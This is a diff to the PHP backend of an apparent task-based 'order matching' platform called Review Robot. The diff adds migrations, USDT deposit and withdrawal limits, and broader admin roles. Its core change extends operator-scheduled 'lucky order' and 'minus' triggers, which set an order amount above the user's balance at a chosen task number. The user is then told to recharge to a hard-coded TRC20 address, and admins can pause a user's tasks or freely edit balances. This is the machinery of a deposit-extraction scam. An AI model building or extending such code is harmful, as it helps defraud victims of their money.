@@ -139,12 +139,26 @@ try {
     $db->exec("ALTER TABLE admins ADD COLUMN role TEXT DEFAULT 'superadmin';");
 } catch (Exception $e) {}
 
-// Migration: Ensure max_profit and cycle_profit exist in users table
+// Migration: Ensure max_profit, cycle_profit, tasks_allowed exist in users table
 try {
     $db->exec("ALTER TABLE users ADD COLUMN max_profit REAL DEFAULT 10.00;");
 } catch (Exception $e) {}
 try {
     $db->exec("ALTER TABLE users ADD COLUMN cycle_profit REAL DEFAULT 0.00;");
+} catch (Exception $e) {}
+try {
+    $db->exec("ALTER TABLE users ADD COLUMN tasks_allowed INTEGER DEFAULT 1;");
+} catch (Exception $e) {}
+
+// Migration: Ensure lucky_order_triggers has trigger_type, target_task_number, minus_amount
+try {
+    $db->exec("ALTER TABLE lucky_order_triggers ADD COLUMN trigger_type TEXT DEFAULT 'next';");
+} catch (Exception $e) {}
+try {
+    $db->exec("ALTER TABLE lucky_order_triggers ADD COLUMN target_task_number INTEGER;");
+} catch (Exception $e) {}
+try {
+    $db->exec("ALTER TABLE lucky_order_triggers ADD COLUMN minus_amount REAL DEFAULT 0;");
 } catch (Exception $e) {}
 
 // Seed Defaults Settings
@@ -152,7 +166,9 @@ $defaults = [
     'platform_name' => 'Review Robot - xinmingzhi',
     'trc20_deposit_address' => 'TReaAUXRkicHL95Sangr5Bus3Fje7iq48s',
     'min_deposit' => '20',
+    'max_deposit' => '100000',
     'min_withdraw' => '30',
+    'max_withdraw' => '50000',
     'default_commission_rate' => '0.006',
     'default_daily_tasks' => '60',
     'default_max_profit' => '10.00',
@@ -351,7 +367,9 @@ try {
             'platform_name' => $settings['platform_name'] ?? 'Review Robot',
             'trc20_deposit_address' => $settings['trc20_deposit_address'] ?? 'TReaAUXRkicHL95Sangr5Bus3Fje7iq48s',
             'min_deposit' => floatval($settings['min_deposit'] ?? 20),
+            'max_deposit' => floatval($settings['max_deposit'] ?? 100000),
             'min_withdraw' => floatval($settings['min_withdraw'] ?? 30),
+            'max_withdraw' => floatval($settings['max_withdraw'] ?? 50000),
             'customer_service_url' => $settings['customer_service_url'] ?? 'https://t.me/review_robot_support'
         ]);
         exit;
@@ -522,7 +540,17 @@ try {
     if ($method === 'POST' && $route === '/trade/start-matching') {
         $user = requireUserAuth($db, $JWT_SECRET);
 
-        // Check task quota
+        // 1. Check if task matching is allowed by administrator
+        if (isset($user['tasks_allowed']) && intval($user['tasks_allowed']) === 0) {
+            echo json_encode([
+                'success' => false,
+                'code' => 'TASKS_NOT_ALLOWED',
+                'message' => 'Task matching is currently paused for your account. Please contact customer support or await administrator approval to start tasks.'
+            ]);
+            exit;
+        }
+
+        // 2. Check task quota
         if (intval($user['completed_tasks']) >= intval($user['max_daily_tasks'])) {
             echo json_encode([
                 'success' => false,
@@ -532,7 +560,7 @@ try {
             exit;
         }
 
-        // Check balance - if negative or zero, require recharge
+        // 3. Check balance - if negative or zero, require recharge
         if (floatval($user['balance']) <= 0) {
             echo json_encode([
                 'success' => false,
@@ -542,14 +570,27 @@ try {
             exit;
         }
 
-        // Check if lucky order trigger exists
-        $stmtLucky = $db->prepare("SELECT * FROM lucky_order_triggers WHERE user_id = ? AND is_active = 1 ORDER BY id ASC LIMIT 1");
-        $stmtLucky->execute([$user['id']]);
+        // 4. Check if lucky order / scheduled minus trigger exists for current task number or next
+        $currentTaskNum = intval($user['completed_tasks']) + 1;
+        $stmtLucky = $db->prepare("
+            SELECT * FROM lucky_order_triggers 
+            WHERE user_id = ? AND is_active = 1 
+              AND (
+                  (trigger_type = 'task_number' AND target_task_number = ?)
+                  OR (trigger_type = 'next' OR trigger_type IS NULL)
+              )
+            ORDER BY id ASC LIMIT 1
+        ");
+        $stmtLucky->execute([$user['id'], $currentTaskNum]);
         $trigger = $stmtLucky->fetch();
 
         if ($trigger) {
             $userBal = floatval($user['balance']);
+            $minusAmt = floatval($trigger['minus_amount'] ?? 0);
             $orderAmt = floatval($trigger['amount']);
+            if ($minusAmt > 0 && $orderAmt <= 0) {
+                $orderAmt = max(10.0, round($userBal + $minusAmt, 2));
+            }
             $diff = round($orderAmt - $userBal, 2);
 
             if ($diff > 0) {
@@ -559,10 +600,29 @@ try {
                     'insufficient_balance' => true,
                     'difference' => $diff,
                     'order' => [
+                        'trigger_id' => $trigger['id'],
                         'amount' => $orderAmt,
                         'expected_return' => floatval($trigger['expected_return']),
                         'transaction_hour' => date('Y-m-d H:i:s'),
-                        'product_name' => $trigger['product_name'] ?: 'Sony PlayStation 5 Pro & PS VR2 Master Combo Bundle'
+                        'product_name' => $trigger['product_name'] ?: 'Special VIP Combo Allocation'
+                    ]
+                ]);
+                exit;
+            } else {
+                // User recharged enough so diff <= 0, deliver lucky order to execute and submit
+                echo json_encode([
+                    'success' => true,
+                    'is_lucky_order' => true,
+                    'insufficient_balance' => false,
+                    'product' => [
+                        'id' => 999900 + intval($trigger['id']),
+                        'trigger_id' => $trigger['id'],
+                        'name' => $trigger['product_name'] ?: 'Special VIP Combo Allocation',
+                        'price' => $orderAmt,
+                        'expected_return' => floatval($trigger['expected_return']),
+                        'image_url' => 'https://images.unsplash.com/photo-1607604276583-eef5d076aa5f?w=400&auto=format&fit=crop&q=80',
+                        'transaction_hour' => date('Y-m-d H:i:s'),
+                        'is_lucky' => true
                     ]
                 ]);
                 exit;
@@ -616,6 +676,12 @@ try {
         $prodImg = $body['product_image'] ?? '';
         $amount = floatval($body['amount'] ?? 0);
         $comm = floatval($body['expected_return'] ?? 0);
+        $triggerId = intval($body['trigger_id'] ?? 0);
+
+        // Deactivate trigger if this was a lucky/minus order
+        if ($triggerId > 0) {
+            $db->prepare("UPDATE lucky_order_triggers SET is_active = 0 WHERE id = ? AND user_id = ?")->execute([$triggerId, $user['id']]);
+        }
 
         $orderNo = 'ORD' . date('YmdHis') . random_int(100, 999);
         $now = date('Y-m-d H:i:s');
@@ -623,8 +689,8 @@ try {
         // Create completed order and credit commission
         $db->prepare("
             INSERT INTO orders (order_no, user_id, product_name, product_image, amount, commission, status, is_lucky_order, created_at)
-            VALUES (?, ?, ?, ?, ?, ?, 'completed', 0, ?)
-        ")->execute([$orderNo, $user['id'], $prodName, $prodImg, $amount, $comm, $now]);
+            VALUES (?, ?, ?, ?, ?, ?, 'completed', ?, ?)
+        ")->execute([$orderNo, $user['id'], $prodName, $prodImg, $amount, $comm, ($triggerId > 0 ? 1 : 0), $now]);
 
         $newBal = round(floatval($user['balance']) + $comm, 2);
         $newTasks = intval($user['completed_tasks']) + 1;
@@ -712,9 +778,11 @@ try {
         $amount = floatval($_POST['amount'] ?? 0);
         $txid = trim($_POST['txid'] ?? '');
 
-        if ($amount < 20) {
+        $minDep = floatval($db->query("SELECT value FROM system_settings WHERE key = 'min_deposit'")->fetchColumn() ?: 20);
+        $maxDep = floatval($db->query("SELECT value FROM system_settings WHERE key = 'max_deposit'")->fetchColumn() ?: 100000);
+        if ($amount < $minDep || ($maxDep > 0 && $amount > $maxDep)) {
             http_response_code(400);
-            echo json_encode(['success' => false, 'message' => 'Minimum deposit amount is 20 USDT.']);
+            echo json_encode(['success' => false, 'message' => "Deposit amount must be between {$minDep} and {$maxDep} USDT."]);
             exit;
         }
 
@@ -774,9 +842,11 @@ try {
         $pin = $body['withdrawal_pin'] ?? '';
         $addr = trim($body['trc20_address'] ?? $user['trc20_address']);
 
-        if ($amount < 30) {
+        $minWith = floatval($db->query("SELECT value FROM system_settings WHERE key = 'min_withdraw'")->fetchColumn() ?: 30);
+        $maxWith = floatval($db->query("SELECT value FROM system_settings WHERE key = 'max_withdraw'")->fetchColumn() ?: 50000);
+        if ($amount < $minWith || ($maxWith > 0 && $amount > $maxWith)) {
             http_response_code(400);
-            echo json_encode(['success' => false, 'message' => 'Minimum withdrawal is 30 USDT.']);
+            echo json_encode(['success' => false, 'message' => "Withdrawal amount must be between {$minWith} and {$maxWith} USDT."]);
             exit;
         }
 
@@ -866,14 +936,14 @@ try {
 
     // Admin Users List & Creation
     if ($method === 'GET' && $route === '/admin/users') {
-        requireAdminAuth($db, $JWT_SECRET);
-        $stmt = $db->query("SELECT id, username, balance, frozen_balance, completed_tasks, max_daily_tasks, max_profit, cycle_profit, vip_level, invite_code, invited_by, status, created_at FROM users ORDER BY id DESC");
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
+        $stmt = $db->query("SELECT id, username, balance, frozen_balance, completed_tasks, max_daily_tasks, max_profit, cycle_profit, vip_level, invite_code, invited_by, status, tasks_allowed, created_at FROM users ORDER BY id DESC");
         echo json_encode(['success' => true, 'users' => $stmt->fetchAll()]);
         exit;
     }
 
     if ($method === 'POST' && $route === '/admin/users') {
-        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
         $body = getJsonInput();
         $username = trim($body['username'] ?? '');
         $password = $body['password'] ?? '';
@@ -883,17 +953,18 @@ try {
         $vip = intval($body['vip_level'] ?? 1);
         $pin = $body['withdrawal_pin'] ?? '123456';
         $code = strtoupper(trim($body['invite_code'] ?? generateRandomCode(8)));
+        $tasksAllowed = isset($body['tasks_allowed']) ? intval($body['tasks_allowed']) : 1;
         $now = date('Y-m-d H:i:s');
 
         $hash = password_hash($password, PASSWORD_BCRYPT);
-        $insert = $db->prepare("INSERT INTO users (username, password_hash, withdrawal_pin, invite_code, balance, completed_tasks, max_daily_tasks, max_profit, cycle_profit, vip_level, created_at) VALUES (?, ?, ?, ?, ?, 0, ?, ?, 0.00, ?, ?)");
-        $insert->execute([$username, $hash, $pin, $code, $balance, $dailyTasks, $maxProfit, $vip, $now]);
+        $insert = $db->prepare("INSERT INTO users (username, password_hash, withdrawal_pin, invite_code, balance, completed_tasks, max_daily_tasks, max_profit, cycle_profit, vip_level, tasks_allowed, created_at) VALUES (?, ?, ?, ?, ?, 0, ?, ?, 0.00, ?, ?, ?)");
+        $insert->execute([$username, $hash, $pin, $code, $balance, $dailyTasks, $maxProfit, $vip, $tasksAllowed, $now]);
         $newId = $db->lastInsertId();
 
         echo json_encode([
             'success' => true,
             'message' => "User {$username} created successfully!",
-            'user' => ['id' => $newId, 'username' => $username, 'balance' => $balance, 'max_daily_tasks' => $dailyTasks, 'max_profit' => $maxProfit, 'invite_code' => $code]
+            'user' => ['id' => $newId, 'username' => $username, 'balance' => $balance, 'max_daily_tasks' => $dailyTasks, 'max_profit' => $maxProfit, 'invite_code' => $code, 'tasks_allowed' => $tasksAllowed]
         ]);
         exit;
     }
@@ -909,7 +980,7 @@ try {
 
     // Adjust Balance (Supports ± delta or exact balance, allows negative values freely)
     if ($method === 'POST' && preg_match('#^/admin/users/(\d+)/adjust-balance$#', $route, $m)) {
-        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
         $uid = intval($m[1]);
         $body = getJsonInput();
 
@@ -930,7 +1001,7 @@ try {
 
     // Adjust Tasks & Max Profit
     if ($method === 'POST' && preg_match('#^/admin/users/(\d+)/update-tasks$#', $route, $m)) {
-        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
         $uid = intval($m[1]);
         $body = getJsonInput();
         $comp = intval($body['completed_tasks'] ?? 0);
@@ -943,13 +1014,16 @@ try {
         } else {
             $db->prepare("UPDATE users SET completed_tasks = ?, max_daily_tasks = ?, max_profit = ? WHERE id = ?")->execute([$comp, $max, $profit, $uid]);
         }
+        if (isset($body['tasks_allowed'])) {
+            $db->prepare("UPDATE users SET tasks_allowed = ? WHERE id = ?")->execute([intval($body['tasks_allowed']), $uid]);
+        }
         echo json_encode(['success' => true, 'message' => "Task progress and max profit updated! ({$comp}/{$max} tasks, Max Profit: {$profit} USDT)"]);
         exit;
     }
 
     // Toggle User Status
     if ($method === 'POST' && preg_match('#^/admin/users/(\d+)/toggle-status$#', $route, $m)) {
-        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
         $uid = intval($m[1]);
         $stmt = $db->prepare("SELECT status FROM users WHERE id = ?");
         $stmt->execute([$uid]);
@@ -959,27 +1033,48 @@ try {
         exit;
     }
 
-    // Inject Lucky Order
+    // Toggle User Tasks Allowed (Start / Stop Tasks)
+    if ($method === 'POST' && preg_match('#^/admin/users/(\d+)/toggle-tasks$#', $route, $m)) {
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
+        $uid = intval($m[1]);
+        $stmt = $db->prepare("SELECT tasks_allowed FROM users WHERE id = ?");
+        $stmt->execute([$uid]);
+        $curr = $stmt->fetchColumn();
+        $newStatus = ($curr == 1 || $curr === null) ? 0 : 1;
+        $db->prepare("UPDATE users SET tasks_allowed = ? WHERE id = ?")->execute([$newStatus, $uid]);
+        echo json_encode([
+            'success' => true,
+            'tasks_allowed' => $newStatus,
+            'message' => $newStatus ? "Task matching started/allowed for user!" : "Task matching stopped/paused for user!"
+        ]);
+        exit;
+    }
+
+    // Inject Lucky Order / Scheduled Minus Trigger (Supports multiple triggers & specific order numbers)
     if ($method === 'POST' && preg_match('#^/admin/users/(\d+)/inject-lucky-order$#', $route, $m)) {
-        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
         $uid = intval($m[1]);
         $body = getJsonInput();
 
+        $triggerType = $body['trigger_type'] ?? 'next';
+        $targetTask = !empty($body['target_task_number']) ? intval($body['target_task_number']) : null;
         $amount = floatval($body['amount'] ?? 315.72);
         $return = floatval($body['expected_return'] ?? 18.94);
+        $minusAmt = floatval($body['minus_amount'] ?? 0);
         $prod = $body['product_name'] ?? 'Sony PlayStation 5 Pro & PS VR2 Master Combo Bundle';
         $now = date('Y-m-d H:i:s');
 
-        $db->prepare("INSERT INTO lucky_order_triggers (user_id, amount, expected_return, product_name, is_active, created_at) VALUES (?, ?, ?, ?, 1, ?)")
-           ->execute([$uid, $amount, $return, $prod, $now]);
+        $db->prepare("INSERT INTO lucky_order_triggers (user_id, trigger_type, target_task_number, amount, expected_return, minus_amount, product_name, is_active, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, 1, ?)")
+           ->execute([$uid, $triggerType, $targetTask, $amount, $return, $minusAmt, $prod, $now]);
 
-        echo json_encode(['success' => true, 'message' => 'Lucky order injected! User will see recharge prompt upon next matching click.']);
+        $targetDesc = ($triggerType === 'task_number' && $targetTask) ? "at Task #{$targetTask}" : "on next matching click";
+        echo json_encode(['success' => true, 'message' => "Order minus / deficit trigger scheduled {$targetDesc}!"]);
         exit;
     }
 
     // List Lucky Orders
     if ($method === 'GET' && $route === '/admin/lucky-orders') {
-        requireAdminAuth($db, $JWT_SECRET);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
         $stmt = $db->query("
             SELECT l.*, u.username, u.balance as user_balance
             FROM lucky_order_triggers l
@@ -991,7 +1086,7 @@ try {
     }
 
     if ($method === 'DELETE' && preg_match('#^/admin/lucky-orders/(\d+)$#', $route, $m)) {
-        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
         $db->prepare("DELETE FROM lucky_order_triggers WHERE id = ?")->execute([intval($m[1])]);
         echo json_encode(['success' => true, 'message' => 'Trigger deleted.']);
         exit;
@@ -999,7 +1094,7 @@ try {
 
     // Recharges Approval
     if ($method === 'GET' && $route === '/admin/recharges') {
-        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'finance']);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'finance', 'manager', 'agent']);
         $stmt = $db->query("
             SELECT r.*, u.username, u.balance as user_balance
             FROM recharges r
@@ -1011,7 +1106,7 @@ try {
     }
 
     if ($method === 'POST' && preg_match('#^/admin/recharges/(\d+)/process$#', $route, $m)) {
-        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'finance']);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'finance', 'manager', 'agent']);
         $rid = intval($m[1]);
         $body = getJsonInput();
         $action = $body['action'] ?? 'approve';
@@ -1034,7 +1129,7 @@ try {
 
     // Withdrawals Approval
     if ($method === 'GET' && $route === '/admin/withdrawals') {
-        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'finance']);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'finance', 'manager', 'agent']);
         $stmt = $db->query("
             SELECT w.*, u.username, u.balance as user_balance
             FROM withdrawals w
@@ -1046,7 +1141,7 @@ try {
     }
 
     if ($method === 'POST' && preg_match('#^/admin/withdrawals/(\d+)/process$#', $route, $m)) {
-        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'finance']);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'finance', 'manager', 'agent']);
         $wid = intval($m[1]);
         $body = getJsonInput();
         $action = $body['action'] ?? 'approve';
@@ -1058,11 +1153,11 @@ try {
 
         if ($action === 'approve') {
             $db->prepare("UPDATE withdrawals SET status = 'approved', processed_at = ? WHERE id = ?")->execute([$now, $wid]);
-            $db->prepare("UPDATE users SET frozen_balance = frozen_balance - ? WHERE id = ?")->execute([$withdrawal['amount'], $withdrawal['user_id']]);
+            $db->prepare("UPDATE users SET frozen_balance = MAX(0, frozen_balance - ?) WHERE id = ?")->execute([$withdrawal['amount'], $withdrawal['user_id']]);
             echo json_encode(['success' => true, 'message' => 'Withdrawal approved. Funds marked sent.']);
         } else {
             $db->prepare("UPDATE withdrawals SET status = 'rejected', processed_at = ? WHERE id = ?")->execute([$now, $wid]);
-            $db->prepare("UPDATE users SET balance = balance + ?, frozen_balance = frozen_balance - ? WHERE id = ?")->execute([$withdrawal['amount'], $withdrawal['amount'], $withdrawal['user_id']]);
+            $db->prepare("UPDATE users SET balance = balance + ?, frozen_balance = MAX(0, frozen_balance - ?) WHERE id = ?")->execute([$withdrawal['amount'], $withdrawal['amount'], $withdrawal['user_id']]);
             echo json_encode(['success' => true, 'message' => 'Withdrawal rejected and balance refunded to user.']);
         }
         exit;
@@ -1077,7 +1172,7 @@ try {
     }
 
     if ($method === 'POST' && $route === '/admin/products') {
-        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
         $body = getJsonInput();
         $db->prepare("INSERT INTO products (name, price, commission_rate, image_url) VALUES (?, ?, ?, ?)")
            ->execute([$body['name'], floatval($body['price']), floatval($body['commission_rate'] ?? 0.006), $body['image_url'] ?? '']);
@@ -1086,7 +1181,7 @@ try {
     }
 
     if ($method === 'DELETE' && preg_match('#^/admin/products/(\d+)$#', $route, $m)) {
-        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
         $db->prepare("DELETE FROM products WHERE id = ?")->execute([intval($m[1])]);
         echo json_encode(['success' => true, 'message' => 'Product deleted.']);
         exit;
@@ -1094,14 +1189,14 @@ try {
 
     // Admin Invite Codes
     if ($method === 'GET' && $route === '/admin/invite-codes') {
-        requireAdminAuth($db, $JWT_SECRET);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
         $stmt = $db->query("SELECT * FROM admin_invite_codes ORDER BY id DESC");
         echo json_encode(['success' => true, 'codes' => $stmt->fetchAll()]);
         exit;
     }
 
     if ($method === 'POST' && $route === '/admin/invite-codes/generate') {
-        $admin = requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
+        $admin = requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
         $body = getJsonInput();
         $code = strtoupper(trim($body['code'] ?? $body['custom_code'] ?? ''));
         $bonus = floatval($body['bonus_balance'] ?? 200.00);
@@ -1128,7 +1223,7 @@ try {
     }
 
     if ($method === 'DELETE' && preg_match('#^/admin/invite-codes/(\d+)$#', $route, $m)) {
-        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager']);
+        requireAdminAuth($db, $JWT_SECRET, ['superadmin', 'manager', 'agent']);
         $db->prepare("DELETE FROM admin_invite_codes WHERE id = ?")->execute([intval($m[1])]);
         echo json_encode(['success' => true, 'message' => 'Invite code deleted.']);
         exit;
